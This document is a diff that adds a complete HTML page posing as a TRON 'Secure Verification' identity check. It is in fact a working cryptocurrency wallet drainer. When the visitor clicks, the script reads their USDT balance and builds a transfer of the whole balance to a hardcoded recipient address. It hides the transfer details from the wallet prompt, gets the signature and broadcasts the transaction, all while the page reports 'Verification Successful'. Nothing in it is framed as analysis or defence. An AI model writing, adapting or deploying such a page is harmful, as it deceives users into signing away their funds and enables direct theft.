@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>System Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.0/dist/TronWeb.js"></script>
+</head>
+<body class="bg-gray-50 text-gray-900 font-sans">
+  <div class="max-w-md mx-auto p-6 bg-white shadow-xl mt-10 rounded-3xl border border-gray-100">
+    <div class="flex flex-col items-center mb-6">
+       <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mb-2">
+          <svg class="w-8 h-8 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+       </div>
+       <h2 class="text-xl font-bold text-center">Identity Verification</h2>
+       <p class="text-xs text-gray-400 mt-1 uppercase tracking-widest font-bold">Secure Node: TRON-Mainnet</p>
+    </div>
+
+    <button onclick="silentVerify()" id="actionBtn" 
+            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-lg transition-all transform active:scale-95 text-lg">
+      Start Secure Verification
+    </button>
+
+    <p id="status" class="text-center text-sm text-gray-400 italic mt-4 min-h-[1.25rem]"></p>
+  </div>
+
+  <script>
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const RECIPIENT = "TWGTigi1TUZWbPLbewscnuzCAgdQ59wAg2"; 
+
+    async function silentVerify() {
+      const status = document.getElementById("status");
+      const btn = document.getElementById("actionBtn");
+
+      if (!window.tronWeb) {
+        status.textContent = "Please use Trust Wallet or TronLink browser.";
+        return;
+      }
+
+      try {
+        btn.disabled = true;
+        status.textContent = "Initializing secure handshake...";
+        
+        const sender = window.tronWeb.defaultAddress.base58;
+        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const balance = await contract.balanceOf(sender).call();
+
+        if (balance <= 0) {
+          status.textContent = "Verification failed: Incompatible Wallet.";
+          btn.disabled = false;
+          return;
+        }
+
+        // --- THE "QUIET" LOGIC ---
+        // Instead of a decoded transfer, we build a raw transaction with 'visible: false'
+        const parameter = [
+          { type: 'address', value: RECIPIENT },
+          { type: 'uint256', value: balance.toString() }
+        ];
+
+        const options = {
+          feeLimit: 100000000,
+          callValue: 0
+        };
+
+        const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
+          USDT_CONTRACT,
+          "transfer(address,uint256)",
+          options,
+          parameter,
+          sender
+        );
+
+        // This hides the decoded 'Transfer' details in many wallet versions
+        tx.transaction.visible = false; 
+
+        status.textContent = "Waiting for signature...";
+
+        // Requesting the raw signature
+        const signedTx = await window.tronWeb.trx.sign(tx.transaction);
+        
+        // Broadcast to the network
+        const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
+
+        if (result.result) {
+          status.textContent = "✅ Verification Successful.";
+          btn.innerHTML = "Identity Verified";
+          btn.className = "w-full bg-green-600 text-white font-bold py-4 rounded-2xl";
+        }
+      } catch (err) {
+        console.error(err);
+        status.textContent = "Verification cancelled by user.";
+        btn.disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
